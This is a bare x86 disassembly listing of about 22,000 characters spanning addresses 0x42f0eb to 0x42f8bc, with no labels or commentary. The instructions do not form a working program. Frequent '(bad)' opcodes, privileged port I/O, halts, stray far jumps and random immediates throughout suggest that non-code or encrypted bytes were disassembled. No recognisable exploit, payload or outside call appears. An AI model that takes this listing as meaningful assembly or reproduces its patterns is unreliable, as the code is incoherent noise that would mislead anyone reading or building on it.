  42f0eb:	jecxz  0x42f0ed
  42f0ed:	fcmovb st,st(0)
  42f0ef:	int3   
  42f0f0:	test   al,0xe2
  42f0f2:	mov    cl,0xc6
  42f0f4:	retf   
  42f0f5:	in     al,dx
  42f0f6:	leave  
  42f0f7:	retf   0xfbec
  42f0fa:	fidiv  DWORD PTR [edi+ecx*8-0x31421205]
  42f101:	(bad)  
  42f102:	xlat   BYTE PTR ds:[ebx]
  42f103:	int3   
  42f104:	clc    
  42f105:	ror    BYTE PTR [edx],cl
  42f107:	in     eax,0xef
  42f109:	add    edx,esi
  42f10b:	(bad)  
  42f10d:	in     al,dx
  42f10e:	in     al,dx
  42f10f:	mov    esi,0xddd5f1c3
  42f114:	out    dx,eax
  42f115:	mov    bh,0xf4
  42f117:	hlt    
  42f118:	fstp   TBYTE PTR [ecx-0x36111a42]
  42f11e:	(bad)  
  42f11f:	cli    
  42f120:	clc    
  42f121:	clc    
  42f122:	mov    ah,0xf8
  42f124:	ret    0xf7db
  42f127:	or     cl,bl
  42f129:	clc    
  42f12a:	dec    BYTE PTR [ebx]
  42f12c:	in     eax,dx
  42f12d:	ficom  DWORD PTR [ebx]
  42f12f:	into   
  42f130:	out    dx,eax
  42f131:	in     al,0xc2
  42f133:	xlat   BYTE PTR ds:[ebx]
  42f134:	mov    al,0xb6
  42f136:	retf   0xd3f1
  42f139:	iret   
  42f13a:	mov    bh,0xd0
  42f13c:	mov    dh,0xcc
  42f13e:	(bad)  
  42f140:	mov    edi,0xd5e7fcbe
  42f145:	inc    BYTE PTR [edx]
  42f147:	jecxz  0x42f125
  42f149:	fcomp  st(0)
  42f14b:	or     eax,0xce04ed0e
  42f150:	out    dx,eax
  42f151:	retf   
  42f152:	jmp    0xf407d64d
  42f157:	mov    ch,0xb2
  42f159:	aad    0xd4
  42f15b:	(bad)  
  42f15d:	call   0xe837db5d
  42f162:	in     al,dx
  42f163:	mov    esp,0x4c3fbf9
  42f168:	add    al,0xde
  42f16a:	iret   
  42f16b:	in     eax,dx
  42f16c:	push   cs
  42f16d:	add    esp,esi
  42f16f:	mov    dl,0xf0
  42f171:	test   eax,0xe5adf7cb
  42f176:	(bad)  
  42f177:	fneni(8087 only) 
  42f179:	lods   eax,DWORD PTR ds:[esi]
  42f17a:	clc    
  42f17b:	shl    eax,1
  42f17d:	fprem1 
  42f17f:	test   DWORD PTR [eax],0xfbbf07bc
  42f185:	stc    
  42f186:	jmp    0xf843e195
  42f18b:	out    dx,al
  42f18c:	(bad)  
  42f18d:	out    dx,al
  42f18e:	enter  0xced8,0xc8
  42f192:	(bad)  
  42f193:	jmp    0x42f145
  42f195:	repz in al,dx
  42f197:	rcr    al,0xc4
  42f19a:	in     al,0xfc
  42f19c:	mov    esi,0xdeb8b4f4
  42f1a1:	aam    0xe1
  42f1a3:	neg    dl
  42f1a5:	(bad)  
  42f1a7:	retf   
  42f1a8:	(bad)  
  42f1aa:	cld    
  42f1ab:	aad    0xd4
  42f1ad:	in     eax,dx
  42f1ae:	jmp    0x42f19c
  42f1b0:	mov    ebp,0xbcc2cde5
  42f1b5:	lock in al,dx
  42f1b7:	(bad)  
  42f1b8:	clc    
  42f1b9:	mov    edi,0xcfd6f0ec
  42f1be:	hlt    
  42f1bf:	mov    ecx,0xecdfb5cf
  42f1c4:	(bad)  
  42f1c5:	ror    DWORD PTR [ecx],cl
  42f1c7:	add    esp,ebx
  42f1c9:	(bad)  
  42f1ca:	fisttp WORD PTR [ebx]
  42f1cc:	psubd  mm1,QWORD PTR [eax]
  42f1cf:	lods   al,BYTE PTR ds:[esi]
  42f1d0:	in     eax,dx
  42f1d1:	(bad)
  42f1d4:	leave  
  42f1d5:	mov    cl,0xc4
  42f1d7:	mov    dh,0xb5
  42f1d9:	leave  
  42f1da:	leave  
  42f1db:	stc    
  42f1dc:	sti    
  42f1dd:	rcl    bh,1
  42f1df:	ffreep st(2)
  42f1e1:	mov    esp,0xf90bdac7
  42f1e6:	pop    es
  42f1e7:	retf   0x10a
  42f1ea:	aam    0x2
  42f1ec:	(bad)  
  42f1ed:	cld    
  42f1ee:	adc    dl,cl
  42f1f0:	out    dx,eax
  42f1f1:	mov    bl,0xf2
  42f1f3:	loopne 0x42f1bb
  42f1f5:	leave  
  42f1f6:	cli    
  42f1f7:	stc    
  42f1f8:	into   
  42f1f9:	lock (bad) 
  42f1fc:	cmc    
  42f1fd:	fcomip st,st(3)
  42f1ff:	add    ebp,esp
  42f201:	pop    es
  42f202:	add    esp,ecx
  42f204:	xlat   BYTE PTR ds:[ebx]
  42f205:	loop   0x42f1f0
  42f207:	std    
  42f208:	aad    0xfc
  42f20a:	out    dx,al
  42f20b:	jmp    0xcb2df00e
  42f210:	leave  
  42f211:	imul   edx
  42f213:	lods   eax,DWORD PTR ds:[esi]
  42f214:	mov    cl,0xd7
  42f216:	mov    bh,0xf7
  42f218:	fdiv   st,st(4)
  42f21a:	(bad)  
  42f21b:	sti    
  42f21c:	les    edi,FWORD PTR [edi-0x4241ff0d]
  42f222:	ret    0xdadd
  42f225:	out    0xd0,al
  42f227:	or     ebx,ecx
  42f229:	fstp   st(2)
  42f22b:	(bad)  
  42f22c:	or     al,0xeb
  42f22e:	faddp  st(5),st
  42f230:	repz shl BYTE PTR [edx-0x35140a3d],0xb5
  42f238:	call   0xd32dcb38
  42f23d:	fninit 
  42f23f:	int    0xe3
  42f241:	repnz in eax,dx
  42f243:	ret    0xf2fa
  42f246:	add    edi,edi
  42f248:	out    0xe7,al
  42f24a:	out    0xce,al
  42f24c:	(bad)  
  42f24e:	fsubr  st,st(7)
  42f250:	xlat   BYTE PTR ds:[ebx]
  42f251:	call   0xf02aa613
  42f256:	fcmovnbe st,st(6)
  42f258:	jmp    0xd6d8:0xb2b7fbcb
  42f25f:	(bad)  
  42f261:	not    bl
  42f263:	fcmovnbe st,st(3)
  42f265:	(bad)  
  42f266:	aad    0xe9
  42f268:	ret    0xbe1
  42f26b:	or     eax,0xe7cff9d9
  42f270:	mov    esp,0xf2e7e1ef
  42f275:	jmp    0xdfcf:0xb8d4f7e7
  42f27c:	mov    edx,0xdec2fdd1
  42f281:	cli    
  42f282:	mov    ecx,0xc6fd040b
  42f288:	(bad)  
  42f289:	fsubp  st(1),st
  42f28b:	enter  0xe913,0xe3
  42f28f:	loopne 0x42f273
  42f291:	ret    
  42f292:	out    dx,eax
  42f293:	lods   al,BYTE PTR ds:[esi]
  42f294:	test   bl,0xb1
  42f297:	mov    bh,0xd4
  42f299:	mov    ebx,0xd9baebed
  42f29e:	mov    ecx,0xfafde2ee
  42f2a3:	aam    0xe5
  42f2a5:	add    al,0xea
  42f2a7:	add    al,cl
  42f2a9:	in     eax,0x9
  42f2ab:	pop    es
  42f2ac:	fsub   st,st(0)
  42f2ae:	rcr    esp,cl
  42f2b0:	(bad)  
  42f2b2:	mov    bh,0xee
  42f2b4:	repz in eax,dx
  42f2b6:	xlat   BYTE PTR ds:[ebx]
  42f2b7:	shr    bl,0xe7
  42f2ba:	icebp  
  42f2bb:	leave  
  42f2bc:	bnd lock call 0xe718e7a5
  42f2c3:	mov    ebx,0xd9e7bdf9
  42f2c8:	(bad)  
  42f2c9:	aam    0xc7
  42f2cb:	jmp    0x42f2a8
  42f2cd:	pop    es
  42f2ce:	in     eax,dx
  42f2cf:	jmp    0xaf07b0b5
  42f2d4:	lods   eax,DWORD PTR ds:[esi]
  42f2d5:	int3   
  42f2d6:	(bad)  
  42f2d7:	icebp  
  42f2d8:	call   0xcf2ed78d
  42f2dd:	out    dx,al
  42f2de:	(bad)  
  42f2e0:	loope  0x42f2d0
  42f2e2:	hlt    
  42f2e3:	cld    
  42f2e4:	mov    ebp,0xc605f7c7
  42f2e9:	stc    
  42f2ea:	in     al,0x5
  42f2ec:	in     al,0xcd
  42f2ee:	or     eax,0xa4c8cfeb
  42f2f3:	ret    0xdaf1
  42f2f6:	shl    ch,0xee
  42f2f9:	retf   
  42f2fa:	in     eax,0xde
  42f2fc:	fdivr  st,st(3)
  42f2fe:	lock fnsave [esi-0xafa0414]
  42f305:	aad    0xff
  42f307:	aam    0x1
  42f309:	mul    dl
  42f30b:	or     eax,0xa9efeae3
  42f310:	(bad)  
  42f312:	not    ch
  42f314:	mov    al,0xd3
  42f316:	(bad)  
  42f317:	mov    al,0xb7
  42f319:	int    0xce
  42f31b:	(bad)  
  42f31c:	out    dx,al
  42f31d:	div    esi
  42f31f:	sti    
  42f320:	(bad)  
  42f322:	rcl    bl,0xd0
  42f325:	or     eax,DWORD PTR [edi]
  42f327:	lock retf 
  42f329:	out    0xd9,eax
  42f32b:	retf   
  42f32c:	cld    
  42f32d:	pop    es
  42f32e:	loopne 0x42f303
  42f330:	(bad)  
  42f332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f333:	mov    bl,0xce
  42f335:	lods   al,BYTE PTR ds:[esi]
  42f336:	mov    bl,0xc9
  42f338:	rcl    cl,1
  42f33a:	mov    eax,0xb0e9d2e8
  42f33f:	add    BYTE PTR [ebp-0x26180504],bh
  42f345:	mov    ecx,0xe5f0f6fc
  42f34a:	fadd   QWORD PTR [edi]
  42f34c:	jmp    0xb2ae:0xe3dce2c9
  42f353:	aam    0xf3
  42f355:	aam    0xb4
  42f357:	xlat   BYTE PTR ds:[ebx]
  42f358:	in     al,dx
  42f359:	(bad)  
  42f35a:	(bad)  
  42f35b:	imul   al
  42f35d:	retf   
  42f35e:	shl    ebx,cl
  42f360:	mov    ecx,0xdcdfe3e2
  42f365:	cld    
  42f366:	(bad)  
  42f367:	(bad)  
  42f368:	in     eax,0xe7
  42f36a:	cmc    
  42f36b:	or     ebx,ebp
  42f36d:	in     eax,0xfc
  42f36f:	iret   
  42f370:	lock retf 
  42f372:	shr    dl,1
  42f374:	jmp    0xf538a02b
  42f379:	in     al,dx
  42f37a:	out    dx,eax
  42f37b:	icebp  
  42f37c:	in     eax,dx
  42f37d:	mov    ecx,0xb500cddd
  42f382:	pop    es
  42f383:	ret    0xd5db
  42f386:	mov    eax,0xf9e3f702
  42f38b:	vpaddusw xmm1,xmm4,XMMWORD PTR ds:0xcca8e6c6
  42f393:	lods   eax,DWORD PTR ds:[esi]
  42f394:	out    0xc7,eax
  42f396:	rol    esp,1
  42f398:	shl    bh,cl
  42f39a:	(bad)  
  42f39b:	lds    edi,FWORD PTR [ecx-0x281d270c]
  42f3a1:	cmc    
  42f3a2:	rol    DWORD PTR [ebx],1
  42f3a4:	mov    esi,0xd7dffaf0
  42f3a9:	in     al,0x4
  42f3ab:	clts   
  42f3ad:	shr    ebx,0xc3
  42f3b0:	mov    dl,0xd7
  42f3b2:	int3   
  42f3b3:	mov    al,0xed
  42f3b5:	mov    bh,0xba
  42f3b7:	mov    al,0xe5
  42f3b9:	leave  
  42f3ba:	out    0xde,al
  42f3bc:	fcmovu st,st(0)
  42f3be:	shl    eax,1
  42f3c0:	rcl    esp,1
  42f3c2:	mov    edi,0xdec6de03
  42f3c7:	or     bl,dl
  42f3c9:	imul   edi
  42f3cb:	loopne 0x42f3d1
  42f3cd:	(bad)  
  42f3cf:	(bad)  
  42f3d1:	ret    0xf3d3
  42f3d4:	cmc    
  42f3d5:	in     al,dx
  42f3d6:	retf   0xb9b1
  42f3d9:	shl    ebp,cl
  42f3db:	fmul   st,st(0)
  42f3dd:	retf   0xc1bc
  42f3e0:	mov    edi,0xd6f8bdfe
  42f3e5:	jmp    0x42f3b8
  42f3e7:	leave  
  42f3e8:	loope  0x42f3f4
  42f3ea:	les    ecx,FWORD PTR [esi]
  42f3ec:	fsubr  st,st(4)
  42f3ee:	jmp    0xc0c4:0xf1f7ace5
  42f3f5:	cli    
  42f3f6:	leave  
  42f3f7:	aam    0xe0
  42f3f9:	(bad)  
  42f3fa:	cli    
  42f3fb:	in     al,0xf4
  42f3fd:	(bad)  
  42f3fe:	ret    0x7e0
  42f401:	aam    0xfb
  42f403:	std    
  42f404:	in     eax,0xd9
  42f406:	idiv   bh
  42f408:	add    bl,bl
  42f40a:	test   BYTE PTR ds:0xcfd30fc9,0xae
  42f411:	out    dx,eax
  42f412:	int3   
  42f413:	(bad)  
  42f414:	xlat   BYTE PTR ds:[ebx]
  42f415:	aad    0xba
  42f417:	aam    0xd7
  42f419:	xlat   BYTE PTR ds:[ebx]
  42f41a:	out    dx,eax
  42f41b:	jmp    0xca1de0e8
  42f420:	mov    esi,0x7f5e5f7
  42f425:	loope  0x42f408
  42f427:	add    al,BYTE PTR [eax]
  42f429:	(bad)  
  42f42a:	jmp    0x42f406
  42f42c:	or     eax,0xe5cee305
  42f431:	repnz shl dl,1
  42f434:	(bad)  
  42f435:	mov    ch,0xe1
  42f437:	rcl    eax,0xef
  42f43a:	les    esi,FWORD PTR [ecx+ebp*8-0x49120303]
  42f441:	(bad)  
  42f443:	add    al,0xdd
  42f445:	aam    0xdc
  42f447:	leave  
  42f448:	add    eax,edi
  42f44a:	enter  0xcede,0xd3
  42f44e:	in     al,dx
  42f44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f450:	loop   0x42f409
  42f452:	not    cl
  42f454:	aad    0xcd
  42f456:	lock (bad) 
  42f458:	(bad)  
  42f459:	fxch   st(7)
  42f45b:	retf   
  42f45c:	iret   
  42f45d:	repz cmc 
  42f45f:	ret    
  42f460:	ret    
  42f461:	int3   
  42f462:	sar    BYTE PTR [esi-0x3f14420b],cl
  42f468:	loop   0x42f448
  42f46a:	mov    BYTE PTR [ebx],0xee
  42f46d:	or     al,BYTE PTR [eax+ebx*8]
  42f470:	lods   al,BYTE PTR ds:[esi]
  42f471:	(bad)
  42f474:	fcmovnbe st,st(2)
  42f476:	div    edi
  42f478:	in     al,dx
  42f479:	out    0xd9,al
  42f47b:	dec    dh
  42f47d:	fcomi  st,st(2)
  42f47f:	out    dx,eax
  42f480:	in     eax,dx
  42f481:	aad    0xde
  42f483:	hlt    
  42f484:	(bad)  
  42f485:	rol    al,1
  42f487:	xlat   BYTE PTR ds:[ebx]
  42f488:	cli    
  42f489:	(bad)
  42f48c:	repz loop 0x42f4a0
  42f48f:	retf   0xe0d8
  42f492:	mov    bh,0xb7
  42f494:	leave  
  42f495:	shl    DWORD PTR [ebp+eax*8-0x35141301],0xcd
  42f49d:	icebp  
  42f49e:	div    ebx
  42f4a0:	repz cli 
  42f4a2:	out    dx,al
  42f4a3:	faddp  st(4),st
  42f4a5:	neg    ecx
  42f4a7:	div    al
  42f4a9:	aam    0xf8
  42f4ab:	out    0xfe,al
  42f4ad:	add    esp,esp
  42f4af:	ret    
  42f4b0:	stos   BYTE PTR es:[edi],al
  42f4b1:	mul    ebx
  42f4b3:	call   0xeb34da6e
  42f4b8:	repz out 0xf4,eax
  42f4bb:	test   esp,0xf8c2cdf5
  42f4c1:	out    dx,eax
  42f4c2:	cld    
  42f4c3:	add    ebx,esp
  42f4c5:	push   es
  42f4c6:	fcmove st,st(1)
  42f4c8:	or     bh,cl
  42f4ca:	stc    
  42f4cb:	ret    
  42f4cc:	out    0x2,eax
  42f4ce:	out    0xc8,eax
  42f4d0:	scas   al,BYTE PTR es:[edi]
  42f4d1:	test   al,0xd0
  42f4d3:	test   esp,0xf9f9d4ed
  42f4d9:	(bad)
  42f4dc:	into   
  42f4dd:	mov    edx,0xbfd7ddbe
  42f4e2:	pop    es
  42f4e3:	add    eax,0xe1fcf2e4
  42f4e8:	push   es
  42f4e9:	loop   0x42f4b1
  42f4eb:	loopne 0x42f4eb
  42f4ed:	retf   
  42f4ee:	or     al,0xa8
  42f4f0:	(bad)  
  42f4f1:	enter  0xf7d1,0xc2
  42f4f5:	(bad)  
  42f4f6:	stc    
  42f4f7:	(bad)  
  42f4f8:	frstpm(287 only) 
  42f4fa:	xlat   BYTE PTR ds:[ebx]
  42f4fb:	retf   
  42f4fc:	shr    cl,1
  42f4fe:	fdivr  st(0),st
  42f500:	into   
  42f501:	(bad)  
  42f502:	xlat   BYTE PTR ds:[ebx]
  42f503:	shr    bl,1
  42f505:	aad    0x0
  42f507:	fld    DWORD PTR [ecx]
  42f509:	aad    0x0
  42f50b:	fadd   st,st(4)
  42f50d:	pop    es
  42f50e:	loop   0x42f4cd
  42f510:	(bad)  
  42f511:	idiv   DWORD PTR [ebp-0x100b2a3a]
  42f517:	rol    ah,cl
  42f519:	mov    edi,0xdeeeccca
  42f51e:	int3   
  42f51f:	add    dl,dl
  42f521:	int    0xee
  42f523:	fld    DWORD PTR [ebx+ecx*1]
  42f526:	jmp    0xc0f:0xd4e9e1e4
  42f52d:	paddd  mm1,mm1
  42f530:	int3   
  42f531:	scas   eax,DWORD PTR es:[edi]
  42f532:	ret    0xefc2
  42f535:	idiv   BYTE PTR [edx-0x2301117]
  42f53b:	in     al,0xff
  42f53d:	in     eax,dx
  42f53e:	loope  0x42f51b
  42f540:	fsincos 
  42f542:	sti    
  42f543:	mul    esp
  42f545:	jmp    0xfbdb:0xddc4c9e7
  42f54c:	enter  0xe308,0xec
  42f550:	int3   
  42f551:	test   eax,0xd0e4b7dd
  42f556:	(bad)  [ebx-0x1a3a4a09]
  42f55c:	fcmovbe st,st(6)
  42f55e:	cli    
  42f55f:	(bad)  
  42f561:	xlat   BYTE PTR ds:[ebx]
  42f562:	fdiv   st,st(1)
  42f564:	neg    ebp
  42f566:	(bad)  
  42f567:	cmc    
  42f568:	fcmovnbe st,st(5)
  42f56a:	leave  
  42f56b:	cli    
  42f56c:	call   0xacebe858
  42f571:	fild   QWORD PTR [ebp-0x174b4d0a]
  42f577:	(bad)  
  42f578:	call   0xb321c669
  42f57d:	mov    ecx,0xcffdf7ba
  42f582:	out    0xd4,eax
  42f584:	(bad)  
  42f585:	ror    BYTE PTR [ecx],0x4
  42f588:	rcl    dh,1
  42f58a:	add    eax,0xda08e4e8
  42f58f:	jmp    0xf221c452
  42f594:	mov    al,0xb3
  42f596:	cmc    
  42f597:	aad    0xf4
  42f599:	mov    cl,0xd7
  42f59b:	dec    ebp
  42f59d:	leave  
  42f59e:	int    0xff
  42f5a0:	int3   
  42f5a1:	rol    DWORD PTR [edi],cl
  42f5a3:	add    al,0xd7
  42f5a5:	rcr    ebp,0xda
  42f5a8:	or     ah,cl
  42f5aa:	out    dx,al
  42f5ab:	iret   
  42f5ac:	fimul  DWORD PTR [eax]
  42f5ae:	std    
  42f5af:	(bad)  
  42f5b1:	enter  0xe4c2,0xc1
  42f5b5:	out    0xc1,al
  42f5b7:	cmc    
  42f5b8:	stc    
  42f5b9:	retf   0xc4f9
  42f5bc:	jmp    0x42f5b6
  42f5be:	in     al,dx
  42f5bf:	aam    0xe2
  42f5c1:	clc    
  42f5c2:	neg    al
  42f5c4:	aam    0xbd
  42f5c6:	pop    es
  42f5c7:	add    eax,0xebd5e5f8
  42f5cc:	out    dx,al
  42f5cd:	in     eax,dx
  42f5ce:	retf   
  42f5cf:	leave  
  42f5d0:	in     al,0xc3
  42f5d2:	in     al,0xe7
  42f5d4:	in     al,0xe3
  42f5d6:	jmp    0xb62aebc0
  42f5db:	out    dx,eax
  42f5dc:	mov    dh,0xeb
  42f5de:	div    ah
  42f5e0:	add    edx,esi
  42f5e2:	cli    
  42f5e3:	(bad)  
  42f5e4:	cmc    
  42f5e5:	add    al,0xca
  42f5e7:	retf   
  42f5e8:	(bad)  
  42f5e9:	(bad)  
  42f5ea:	jmp    0x42f5ee
  42f5ec:	clc    
  42f5ed:	fimul  DWORD PTR [esi]
  42f5ef:	(bad)  
  42f5f0:	fmul   st(1),st
  42f5f2:	retf   
  42f5f3:	int    0xd7
  42f5f5:	ror    ebp,1
  42f5f7:	(bad)  
  42f5f9:	mov    bh,0xed
  42f5fb:	fcmovnbe st,st(6)
  42f5fd:	into   
  42f5fe:	aam    0xc8
  42f600:	pop    es
  42f601:	ret    0xe7b8
  42f604:	fdivr  st,st(0)
  42f606:	stc    
  42f607:	in     eax,0x2
  42f609:	loop   0x42f5ff
  42f60b:	cli    
  42f60c:	fmulp  st(5),st
  42f60e:	loopne 0x42f5b7
  42f610:	jecxz  0x42f5f0
  42f612:	cmc    
  42f613:	in     eax,dx
  42f614:	lods   eax,DWORD PTR ds:[esi]
  42f615:	cmc    
  42f616:	aad    0xb3
  42f618:	rcr    ecx,1
  42f61a:	in     al,dx
  42f61b:	aam    0xf3
  42f61d:	mov    esp,0xdeb9ecfb
  42f622:	rcr    esi,1
  42f624:	mov    esp,0xe0c0ebd3
  42f629:	test   BYTE PTR [edi],0xde
  42f62c:	or     eax,0xb0dfe8f3
  42f631:	mov    al,0xe6
  42f633:	rol    eax,0xc7
  42f636:	fidivr DWORD PTR [ecx-0x212184a]
  42f63c:	fadd   DWORD PTR [ebx]
  42f63e:	loope  0x42f5fe
  42f640:	mov    edx,0xc306e1d6
  42f645:	idiv   ch
  42f647:	ret    0xfcc6
  42f64a:	(bad)  
  42f64c:	loop   0x42f659
  42f64e:	add    ah,al
  42f650:	mov    ebp,0xc4e3dccb
  42f655:	loop   0x42f643
  42f657:	in     al,0xfa
  42f659:	mov    ebx,0xcab2eae8
  42f65e:	shl    bl,cl
  42f660:	rol    BYTE PTR [edx],1
  42f662:	loopne 0x42f636
  42f664:	rol    bl,1
  42f666:	shl    eax,0xc2
  42f669:	(bad)  
  42f66a:	retf   
  42f66b:	bswap  edx
  42f66d:	push   cs
  42f66e:	loop   0x42f654
  42f670:	test   eax,0xb6c5bee7
  42f675:	retf   0xfad5
  42f678:	(bad)  
  42f679:	shr    edx,cl
  42f67b:	in     eax,0xbe
  42f67d:	out    dx,al
  42f67e:	fsub   st(4),st
  42f680:	(bad)  
  42f682:	idiv   DWORD PTR [ebp-0x3f161c27]
  42f688:	clc    
  42f689:	fdiv   st(5),st
  42f68b:	iret   
  42f68c:	lsl    eax,WORD PTR [edi]
  42f68f:	ret    0xbcc3
  42f692:	mov    bl,0xe3
  42f694:	jecxz  0x42f683
  42f696:	retf   
  42f697:	retf   
  42f698:	in     al,0xeb
  42f69a:	in     al,dx
  42f69b:	retf   
  42f69c:	jecxz  0x42f688
  42f69e:	clc    
  42f69f:	(bad)  
  42f6a0:	mov    edi,0xc7edd0bc
  42f6a5:	retf   
  42f6a6:	retf   
  42f6a7:	retf   
  42f6a8:	fimul  DWORD PTR [edi]
  42f6aa:	or     BYTE PTR [ebx+edi*8],cl
  42f6ad:	add    eax,0xedc0e1eb
  42f6b2:	repz in al,dx
  42f6b4:	int3   
  42f6b5:	sti    
  42f6b6:	loopne 0x42f67f
  42f6b8:	icebp  
  42f6b9:	ror    ebx,1
  42f6bb:	repnz aad 0xd7
  42f6be:	hlt    
  42f6bf:	fcomip st,st(5)
  42f6c1:	cmc    
  42f6c2:	in     al,dx
  42f6c3:	loop   0x42f691
  42f6c5:	xlat   BYTE PTR ds:[ebx]
  42f6c6:	(bad)  
  42f6c7:	rcr    eax,1
  42f6c9:	retf   
  42f6ca:	fldz   
  42f6cc:	jmp    0xe4e8:0xf1c00cf2
  42f6d3:	shl    eax,cl
  42f6d5:	(bad)  
  42f6d6:	repnz test eax,0xd7f2ddc4
  42f6dd:	mov    ebx,0x1bdd3d6
  42f6e2:	pop    es
  42f6e3:	in     eax,dx
  42f6e4:	fsub   st,st(2)
  42f6e6:	shr    ecx,1
  42f6e8:	fld    st(5)
  42f6ea:	(bad)  
  42f6ec:	add    al,0x1
  42f6ee:	cli    
  42f6ef:	in     al,0xca
  42f6f1:	lods   al,BYTE PTR ds:[esi]
  42f6f2:	int3   
  42f6f3:	hlt    
  42f6f4:	jecxz  0x42f6e0
  42f6f6:	loop   0x42f6df
  42f6f8:	shl    bh,0xfa
  42f6fb:	(bad)  
  42f6fd:	enter  0xdaf8,0xd2
  42f701:	clc    
  42f702:	mov    eax,0xcbd1f1bc
  42f707:	in     al,0xb
  42f709:	mov    ebp,0xece1deea
  42f70e:	repz out dx,eax
  42f710:	int3   
  42f711:	lods   eax,DWORD PTR ds:[esi]
  42f712:	lods   eax,DWORD PTR ds:[esi]
  42f713:	mov    dh,0xc0
  42f715:	mov    dh,0xfb
  42f717:	fldln2 
  42f719:	aam    0xcd
  42f71b:	mov    edx,0xcedad9fe
  42f720:	mov    edi,0xc0e405fe
  42f725:	icebp  
  42f726:	(bad)  
  42f728:	std    
  42f729:	(bad)  
  42f72a:	sti    
  42f72b:	std    
  42f72c:	jmp    0x42f710
  42f72e:	or     ebp,ebp
  42f730:	mov    esp,0xdbc0d0c3
  42f735:	aad    0xb2
  42f737:	mov    ah,0xc8
  42f73a:	shl    esp,cl
  42f73c:	out    dx,eax
  42f73d:	fidivr DWORD PTR [edi-0x420490d]
  42f743:	fsubrp st(7),st
  42f745:	(bad)  
  42f746:	fsubr  st(2),st
  42f748:	add    eax,0xfd08e0f5
  42f74d:	or     bh,bh
  42f74f:	rcr    esp,0xb1
  42f752:	out    0xb5,eax
  42f754:	mov    bl,0xe3
  42f756:	repz mov dl,0xc0
  42f759:	fistp  QWORD PTR [edx-0x310b4a2b]
  42f75f:	repnz cld 
  42f761:	icebp  
  42f762:	mov    edi,0xc6d7d7e2
  42f767:	add    al,0xfb
  42f769:	xabort 0xce
  42f76c:	add    ecx,DWORD PTR [eax]
  42f76e:	fild   QWORD PTR [edi-0x231e2d3a]
  42f774:	shl    ch,1
  42f776:	(bad)  
  42f777:	cli    
  42f778:	fldz   
  42f77a:	mov    edx,0xf0d0f5cc
  42f77f:	(bad)  
  42f780:	mov    dh,0xfe
  42f782:	test   DWORD PTR [ebx],0x6c000fc
  42f788:	ret    0xe603
  42f78b:	in     al,dx
  42f78c:	enter  0x13f9,0xc9
  42f790:	mov    eax,0xe1cedcd7
  42f795:	enter  0xd4cb,0xd1
  42f799:	retf   
  42f79a:	cmc    
  42f79b:	sar    BYTE PTR [ecx-0x29ff0e25],cl
  42f7a1:	cmc    
  42f7a2:	repz loope 0x42f768
  42f7a5:	mul    esp
  42f7a7:	leave  
  42f7a8:	fadd   DWORD PTR [esi+eax*1]
  42f7ab:	or     eax,DWORD PTR [edi]
  42f7ad:	in     al,0xef
  42f7af:	out    0xeb,eax
  42f7b1:	mov    edi,0xd2d0e1b2
  42f7b6:	repz fcomp st(7)
  42f7b9:	shr    BYTE PTR [ebp+edx*8-0x474f0231],cl
  42f7c0:	fmul   st,st(5)
  42f7c2:	add    edi,ebx
  42f7c4:	loope  0x42f79c
  42f7c6:	mov    eax,0xd8c1c8cb
  42f7cb:	jmp    0x42f7b4
  42f7cd:	(bad)  
  42f7ce:	jmp    0xe1f2e48c
  42f7d3:	aad    0xce
  42f7d5:	mov    ebx,0xf2ecfad6
  42f7da:	jmp    0xd61df3a9
  42f7df:	sti    
  42f7e0:	call   ebp
  42f7e2:	cmc    
  42f7e3:	out    0x5,al
  42f7e5:	sar    esp,cl
  42f7e7:	(bad)  
  42f7e8:	fiadd  DWORD PTR ds:0x4efebcb
  42f7ee:	les    edi,FWORD PTR [edi-0x142e2330]
  42f7f4:	loopne 0x42f7e8
  42f7f6:	mov    dl,0xca
  42f7f8:	lock aam 0xba
  42f7fb:	xlat   BYTE PTR ds:[ebx]
  42f7fc:	std    
  42f7fd:	aad    0xe9
  42f7ff:	leave  
  42f800:	mov    edi,0xf3ed06fb
  42f805:	sar    esi,1
  42f807:	stc    
  42f808:	sti    
  42f809:	std    
  42f80a:	enter  0x6ed,0x9
  42f80e:	std    
  42f80f:	mov    ebp,0xc1f0a5e6
  42f814:	leave  
  42f815:	repnz mov cl,0xcc
  42f818:	(bad)  
  42f819:	mov    edx,0xf7bcefb4
  42f81e:	mov    esp,0xdbffb6b8
  42f823:	cld    
  42f824:	out    0xd2,al
  42f826:	jecxz  0x42f7f8
  42f828:	push   es
  42f829:	pop    es
  42f82a:	push   cs
  42f82b:	or     ebx,ebx
  42f82d:	push   es
  42f82e:	fnstsw WORD PTR [eax+ebp*4-0x1e1b180a]
  42f835:	mov    cl,0xf6
  42f837:	enter  0xf9b4,0xba
  42f83b:	mov    ecx,0xda01d6c4
  42f840:	fcmovu st,st(0)
  42f842:	shl    edx,1
  42f844:	mov    ebp,0xe1bf0ad5
  42f849:	cld    
  42f84a:	push   cs
  42f84b:	jmp    esi
  42f84d:	out    dx,al
  42f84e:	jmp    0x42f837
  42f850:	loop   0x42f840
  42f852:	in     eax,0xc4
  42f854:	retf   0xb1fa
  42f857:	mov    dl,0xe9
  42f859:	mov    al,0xf3
  42f85b:	(bad)
  42f85e:	mov    eax,0xb40207cd
  42f863:	cmc    
  42f864:	out    0xa,eax
  42f866:	xlat   BYTE PTR ds:[ebx]
  42f867:	fld1   
  42f869:	sti    
  42f86a:	(bad)  
  42f86b:	clc    
  42f86c:	or     edi,esp
  42f86e:	in     eax,0xac
  42f870:	jmp    0xb4ea:0xeee0eef6
  42f877:	in     eax,0xd9
  42f879:	mov    edx,0xeefbcbe9
  42f87e:	aad    0xdd
  42f880:	out    dx,al
  42f881:	fiadd  WORD PTR [edx]
  42f883:	add    bl,al
  42f885:	loope  0x42f85c
  42f887:	fcmovu st,st(0)
  42f889:	jecxz  0x42f872
  42f88b:	(bad)  
  42f88c:	iret   
  42f88d:	or     edx,DWORD PTR [ecx]
  42f88f:	test   eax,0xb3f3efd8
  42f894:	loopne 0x42f863
  42f896:	call   0xef0fec94
  42f89b:	leave  
  42f89c:	mov    dl,0xed
  42f89e:	fdiv   st,st(4)
  42f8a0:	repz mov edi,0xe3fac2c0
  42f8a6:	fdivp  st(1),st
  42f8a8:	out    0x7,eax
  42f8aa:	leave  
  42f8ab:	aam    0xc6
  42f8ad:	push   ecx
  42f8af:	mov    bl,0xec
  42f8b1:	shl    BYTE PTR [ebx-0xc2e5253],0xf7
  42f8b8:	sar    edx,cl
  42f8ba:	div    bl
  42f8bc:	shr    ecx,cl
